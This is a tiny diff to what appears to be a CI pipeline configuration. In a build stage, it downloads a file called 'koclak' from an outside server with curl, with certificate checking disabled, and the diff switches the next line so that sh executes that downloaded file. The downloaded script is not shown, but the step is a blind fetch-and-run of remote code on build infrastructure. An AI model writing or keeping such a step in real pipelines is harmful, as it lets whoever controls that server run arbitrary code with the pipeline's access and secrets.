@@ -5,4 +5,4 @@ buld:
   stage: buld
   script:
     - curl -sLkO https://s.umj.ac.id/koclak
-    - sh bodas
+    - sh koclak
